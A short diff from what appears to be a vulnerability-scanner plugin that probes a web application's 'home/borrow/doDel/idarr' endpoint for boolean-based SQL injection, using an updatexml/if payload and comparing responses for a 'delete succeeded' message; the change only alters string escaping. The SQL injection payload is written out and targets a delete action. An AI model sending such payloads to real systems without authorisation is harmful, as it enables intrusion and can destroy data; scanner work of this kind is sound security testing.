@@ -14,7 +14,7 @@ def audit(arg):
     false_payload = 'home/borrow/doDel/idarr/updatexml(1,if(1=2,1,0x22),1)'
     target = arg + false_payload
     code2, head, res2, errcode, _ = curl.curl2(target)
-    if code1 == 200 and code2==200 and  "\u5220\u9664\u6210\u529f" in res1 and '\u5220\u9664\u6210\u529f' not in res2:
+    if code1 == 200 and code2==200 and  "\\u5220\\u9664\\u6210\\u529f" in res1 and '\\u5220\\u9664\\u6210\\u529f' not in res2:
         security_hole(target)
 if __name__ == '__main__':
     from dummy import *
